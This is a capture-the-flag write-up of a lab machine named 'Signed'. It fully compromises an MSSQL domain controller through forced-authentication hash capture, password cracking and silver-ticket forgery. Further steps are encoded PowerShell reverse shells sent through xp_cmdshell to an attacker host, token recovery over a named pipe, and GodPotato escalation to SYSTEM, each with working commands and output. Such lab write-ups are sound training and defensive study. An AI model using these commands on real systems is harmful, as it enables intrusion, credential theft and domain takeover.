---
title: "Signed"
slug: "signed"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "foothold"
    label: "Foothold"
  - id: "silver-ticket-forgery"
    label: "Silver Ticket Forgery"
  - id: "user-flag"
    label: "User Flag"
  - id: "root-flag"
    label: "Root Flag"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I started with a full TCP port scan and found only 1433 open.

```
$ nmap -p- -Pn -n -sCV -T4 --min-rate=10000 10.129.242.173
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 23:47 +0200
Nmap scan report for 10.129.242.173
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.242.173:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.242.173:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-20T13:48:04
|_Not valid after:  2056-08-20T13:48:04
|_ssl-date: 2026-08-20T13:48:28+00:00; -7h59m59s from scanner time.

Host script results:
|_clock-skew: mean: -7h59m59s, deviation: 0s, median: -7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.13 seconds
```

> **Note:** The `ms-sql-ntlm-info` script leaked the hostname and domain, showing this is `DC01.SIGNED.HTB`, which is unusual for a domain controller.

## Foothold

I logged into MSSQL with the provided `scott:Sm230#C5NatH` credentials. Finding nothing useful, I used `xp_dirtree` to coerce authentication to my Responder listener and steal the hash.

```
$ impacket-mssqlclient signed/scott:'Sm230#C5NatH'@signed.htb
<SNIP>
SQL (scott  guest@master)> xp_dirtree \\10.10.14.56\a
subdirectory   depth   file
------------   -----   ----
```

My Responder listener caught the `mssqlsvc` service account's NetNTLMv2 hash.

```
$ sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:6209f5e7ff63ece2:3FC46A7C2988BA326E6B4408274C0E88:0101000000000000806903409031DD0143A88BA32682716E000000000200080042004C004600590001001E00570049004E002D0051003900410043005A005A0049004B004D004B00590004003400570049004E002D0051003900410043005A005A0049004B004D004B0059002E0042004C00460059002E004C004F00430041004C000300140042004C00460059002E004C004F00430041004C000500140042004C00460059002E004C004F00430041004C0007000800806903409031DD0106000400020000000800300030000000000000000000000000300000C938924CD31690C8549B8B924ECB830F65FDCA22F75515AADE2D9385F07F74FA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350036000000000000000000
```

I ran the captured hash against rockyou and it cracked in about a second.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
1g 0:00:00:01 DONE (2026-08-21 00:38) 0.6711g/s 3011Kp/s 3011Kc/s 3011KC/s purcitititya..puppuh
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Re-authenticating to MSSQL as `mssqlsvc` and enumerating again, I noticed something had changed — the `SIGNED\IT` domain group now holds sysadmin on the database.

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0
```

> **Note:** `SIGNED\IT` is a domain group with sysadmin on the database. Owning the `mssqlsvc` password means I hold its Kerberos key, so I can forge a ticket that claims IT membership — a silver ticket.

## Silver Ticket Forgery

I pulled the `IT` group's SID, and also grabbed `mssqlsvc`'s own SID, since I'll need its RID as the user-id in the forged ticket.

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\IT')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\mssqlsvc')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

To decode the raw binary SIDs into string form, I used this script.

```python
import binascii
import sys


def sid_bytes_to_string(sid_bytes: bytes) -> str:
    """
    Convert a binary SID (raw bytes) into its canonical string form,
    e.g. b'\\x01\\x05\\x00...' -> "S-1-5-21-...-...-...-1013"

    Binary SID layout:
      byte 0        : revision
      byte 1        : sub-authority count (N)
      bytes 2-7     : identifier authority (6 bytes, big-endian)
      bytes 8...    : N sub-authorities (4 bytes each, little-endian)
    """
    if len(sid_bytes) < 8:
        raise ValueError("SID byte array too short (need at least 8 bytes)")

    revision = sid_bytes[0]
    sub_auth_count = sid_bytes[1]

    identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder="big")

    expected_len = 8 + (sub_auth_count * 4)
    if len(sid_bytes) < expected_len:
        raise ValueError(
            f"SID byte array too short: expected {expected_len} bytes "
            f"for {sub_auth_count} sub-authorities, got {len(sid_bytes)}"
        )

    sub_authorities = []
    offset = 8
    for _ in range(sub_auth_count):
        chunk = sid_bytes[offset:offset + 4]
        sub_authorities.append(int.from_bytes(chunk, byteorder="little"))
        offset += 4

    parts = [f"S-{revision}-{identifier_authority}"]
    parts.extend(str(sa) for sa in sub_authorities)
    return "-".join(parts)


def hex_to_sid(hex_string: str) -> str:
    """Convert a hex string (e.g. from a hex dump / LDAP objectSid) to SID string form."""
    cleaned = hex_string.strip().replace(" ", "").replace("\\x", "")
    sid_bytes = binascii.unhexlify(cleaned)
    return sid_bytes_to_string(sid_bytes)


if __name__ == "__main__":
    # Accept a hex string as a command-line argument, otherwise fall back to
    # the example from the prompt.
    if len(sys.argv) > 1:
        hex_sid = sys.argv[1]
    else:
        hex_sid = "0105000000000009040000001d9c8bf73ed9774b8828e27f7ee84a4f"

    print(hex_to_sid(hex_sid))
```

Decoding them gives me the `IT` group at RID 1105 and `mssqlsvc` at RID 1103.

```
$ python3 sid_convert.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
S-1-5-21-4088429403-1159899800-2753317549-1105

$ python3 sid_convert.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
S-1-5-21-4088429403-1159899800-2753317549-1103
```

I converted the cracked password into its NT hash so `ticketer` can sign the ticket with the right key.

```
$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc
```

I forged a silver ticket for the MSSQL SPN, injecting Domain Admins (512) and IT (1105) into the group list, with the user-id set to `mssqlsvc`'s RID so MSSQL maps me correctly.

```
$ impacket-ticketer -spn 'mssqlsvc/dc01.signed.htb:1433' -nthash ef699384c3285c54128a3ee1ddb1a0cc  -domain signed.htb -groups 512,1105 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -dc-ip 10.129.242.173 mssqlsvc
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

> **Note:** A silver ticket is signed with the service account's key and never validated against the KDC, so the group memberships I baked into its PAC are trusted blindly.

The first connection attempt failed with an "untrusted domain" error. Since every ingredient looked correct, I suspected clock skew.

```
$ KRB5CCNAME=./mssqlsvc.ccache impacket-mssqlclient dc01.signed.htb -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[-] ERROR(DC01): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```

The usual time-sync ports were firewalled, so `rdate` timed out and I couldn't sync the normal way.

```
$ sudo rdate -n 10.129.242.173
rdate: Not enough valid responses received in time
rdate: Unable to get a reasonable time estimate
```

Instead, I read the DC's actual UTC off the nmap `ssl-date` line and manually set my host clock to match.

```
sudo date -u -s "YYYY-MM-DD hh:mm:ss"
```

## User Flag

With the clock fixed, the connection worked. I landed as `dbo`, enabled `xp_cmdshell`, confirmed it ran as `signed\mssqlsvc`, and read the user flag.

```
$ KRB5CCNAME=./mssqlsvc.ccache impacket-mssqlclient dc01.signed.htb -k -no-pass
<SNIP>
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami"
output
---------------
signed\mssqlsvc
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "type C:\users\mssqlsvc\desktop\user.txt"
output
--------------------------------
d6ff************************a816
```

## Root Flag

Because my ticket carries Domain Admins, I used `OPENROWSET(BULK)` — which reads using the ticket's groups rather than the restricted host token — to read the root flag from the Administrator's desktop.

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents;
BulkColumn
---------------------------------------
b'bf3e************************0548\r\n'
```

## Privilege Escalation

I had both flags at this point, but reading them isn't the same as owning the box, so let's get a proper SYSTEM shell.

I passed a base64-encoded PowerShell reverse shell through `xp_cmdshell` to get an interactive shell.

```
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

I caught the shell as `signed\mssqlsvc` and checked my privileges. `SeImpersonatePrivilege` is missing — odd for a service account, and a sign it's been deliberately stripped.

```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.242.173] 50205

PS C:\Windows\system32> whoami
signed\mssqlsvc
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
SeCreateGlobalPrivilege       Create global objects              Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
```

On the attack host, I downloaded the prebuilt `NtObjectManager` package from the PowerShell Gallery and started a Python HTTP server.

```
$ curl -s https://cdn.powershellgallery.com/packages/ntobjectmanager.2.0.1.nupkg -O && python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the target, I created a temp directory and pulled the package down with `certutil`.

```
PS C:\Windows\system32> mkdir c:\temp


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
d-----        8/21/2026   8:45 AM                temp                                                                 


PS C:\Windows\system32> cd c:\temp
PS C:\temp> certutil -f -split -urlcache http://10.10.14.56:8000/ntobjectmanager.2.0.1.nupkg
****  Online  ****
  000000  ...
  578dc0
CertUtil: -URLCache command completed successfully.
```

A `.nupkg` is just a zip, so I renamed it and extracted it to recover the module files and their DLLs.

```
PS C:\temp> Copy-Item C:\temp\ntobjectmanager.2.0.1.nupkg C:\temp\ntobj.zip
PS C:\temp> Expand-Archive C:\temp\ntobj.zip -DestinationPath C:\temp\ntobj
```

I unblocked the extracted files, then imported the module.

```
PS C:\temp> Get-ChildItem C:\temp\ntobj -Recurse | Unblock-File
PS C:\temp> Import-Module C:\temp\ntobj\NtObjectManager.psd1
PS C:\temp> Get-Module NtObjectManager
```

I set up my own named pipe.

```
PS C:\temp> $pipe = New-NtNamedPipeFile \\.\pipe\pentest -Win32Path
```

I started the pipe listening in a background thread with `Start-ThreadJob`, which runs in the same process so it can see the `$pipe` object.

```
PS C:\temp> $job = Start-ThreadJob { $pipe.Listen() }
```

I connected to my own pipe over the localhost SMB path, forcing the kernel redirector to authenticate with `mssqlsvc`'s original stored logon token.

```
PS C:\temp> $file = Get-NtFile \\localhost\pipe\pentest -Win32Path
```

I impersonated the pipe client and dumped the recovered token's privileges — and there it is, `SeImpersonatePrivilege`, restored from the original boot token.

```
PS C:\temp> $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
PS C:\temp> $token.Privileges | ft Name, Attributes

Name                                         Attributes
----                                         ----------
SeAssignPrimaryTokenPrivilege                   Enabled
SeIncreaseQuotaPrivilege                        Enabled
SeMachineAccountPrivilege                       Enabled
SeChangeNotifyPrivilege       EnabledByDefault, Enabled
SeImpersonatePrivilege        EnabledByDefault, Enabled
SeCreateGlobalPrivilege       EnabledByDefault, Enabled
SeIncreaseWorkingSetPrivilege                   Enabled
```

> **Note:** The privilege was only removed from the running session; the stored logon token kept it, so authenticating to my own pipe recovered the full token.

I downloaded [GodPotato](https://github.com/BeichenDream/GodPotato) and again started a Python HTTP server.

```
$ curl -s https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O -L && python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

I transferred GodPotato onto the target.

```
PS C:\temp> certutil -f -split -urlcache http://10.10.14.56:8000/GodPotato-NET4.exe .\GodPotato-NET4.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

I launched GodPotato under the recovered `SeImpersonate`-bearing token, passing a base64 reverse shell as the payload.

```
PS C:\temp> New-Win32Process -CommandLine 'C:\temp\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA2ACIALAA5ADAAMAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="' -Token $token
```

I caught the final shell as `nt authority\system` — the box is fully compromised.

```
$ rlwrap nc -lnvp 9005
listening on [any] 9005 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.242.173] 53355

PS C:\Windows\system32> whoami
nt authority\system
```

## Key Takeaways

**Service Account Hashes Are a Silver-Ticket Goldmine** — Coercing authentication with `xp_dirtree` and cracking the resulting NetNTLMv2 hash handed me the `mssqlsvc` password, and therefore its Kerberos key. Any service account whose password is weak or crackable lets an attacker mint tickets for its SPN offline. Enforce long, random service-account passwords, or use gMSAs, so the hash can't be cracked.

**Silver Tickets Forge Arbitrary Group Membership** — Because a silver ticket is signed with the service key and never checked against the KDC, I injected Domain Admins and the sysadmin-bearing IT group straight into the PAC. Services that trust the PAC without KDC validation (like MSSQL Windows auth) can't tell a forged group claim from a real one. PAC validation and monitoring for anomalous ticket use are the defensive levers here.

**Over-Privileged Tickets Cross Token Boundaries** — `xp_cmdshell` ran under a restricted host token, but `OPENROWSET(BULK)` honored the ticket's Domain Admins membership, reading files the shell couldn't. The permissions an operation uses aren't always the ones you expect — the same identity can read at two different privilege levels depending on the code path.

**Stripping a Privilege Isn't Removing It** — `SeImpersonatePrivilege` was scrubbed from the live session, yet the original boot token still carried it and was handed back through a localhost named-pipe authentication. Hardening that only touches the running token, and leaves the stored logon token intact, provides a false sense of security.

**Clock Skew Breaks Kerberos Silently** — The forged ticket was perfect; an ~8-hour clock difference was the only thing standing between me and `dbo`. When Kerberos fails with vague "untrusted domain" errors and everything else checks out, sync your clock to the DC — here, by reading UTC straight off the nmap `ssl-date` line when the time-sync ports were firewalled.
